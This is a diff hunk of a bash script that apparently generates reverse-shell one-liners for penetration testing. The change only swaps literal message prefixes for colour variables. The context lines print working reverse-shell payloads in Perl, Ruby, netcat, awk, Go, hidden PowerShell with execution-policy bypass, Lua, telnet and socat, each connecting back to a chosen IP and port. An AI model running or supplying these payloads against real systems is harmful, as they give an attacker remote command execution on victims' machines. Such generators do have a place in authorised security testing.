@@ -30,13 +30,13 @@ if { [ "$1" == "revshell" ] || [ "$1" == "rev" ]; } && [ "$#" -ge 2 ]; then
     "perl")                         echo "perl -e 'use Socket;\$i="\"$(getIP)\"";\$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" ;;
     "ruby")                         echo "ruby -rsocket -e'f=TCPSocket.open(\"$(getIP)\",$PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" ;;
     "nc"|"ncat"|"netcat")           echo "nc -e /bin/sh $(getIP) $PORT" ;;
-    "awk")                          echo -e "[*] WARNING: This shell is NOT upgradeable!\n"; echo "awk 'BEGIN {s=\"/inet/tcp/0/$(getIP)/$PORT\";while(42){do{printf \"shell> \"|& s;s|& getline c; if(c){while((c|& getline)>0) print \$0|& s;close(c);}} while(c!=\"exit\") close(s);}}' /dev/null" ;;
+    "awk")                          echo -e "${info} WARNING: This shell is NOT upgradeable!\n"; echo "awk 'BEGIN {s=\"/inet/tcp/0/$(getIP)/$PORT\";while(42){do{printf \"shell> \"|& s;s|& getline c; if(c){while((c|& getline)>0) print \$0|& s;close(c);}} while(c!=\"exit\") close(s);}}' /dev/null" ;;
     "go"|"golang")                  echo "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"$(getIP):$PORT\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go" ;;
     "ps"|"psh"|"powershell"|"pwsh") echo "powershell -NoP -NonI -W Hidden -Exec Bypass -c \"\$a=New-Object System.Net.Sockets.TCPClient('$(getIP)',$PORT);\$b=\$a.GetStream();[byte[]]\$d=0..65535|%{0};while((\$e=\$b.Read(\$d,0,\$d.Length)) -ne 0){;\$i=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$d,0,\$e);\$k=(iex \$i 2>&1|Out-String);\$m=\$k+'PS '+(pwd).Path+'> ';\$o=([text.encoding]::ASCII).GetBytes(\$m);\$b.Write(\$o,0,\$o.Length);\$b.Flush()};\$a.Close()\"" ;;
     "lua")                          echo -e "# Linux (tested with lua5.3):\nlua -e \"require('os');s=require('socket');s.tcp();s.connect('$(getIP)','$PORT');os.execute('/bin/sh -i <&3 >&3 2>&3')" ;;
     "telnet")                       echo "rm -f /tmp/p; mknod /tmp/p p && telnet $(getIP) $PORT 0/tmp/p" ;;
     "socat")                        echo "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$(getIP):$PORT" ;;
-    *)                              echo "[!] Unknown revshell type!" ;;
+    *)                              echo "${warn} Unknown revshell type!" ;;
   esac
   echo
   exit
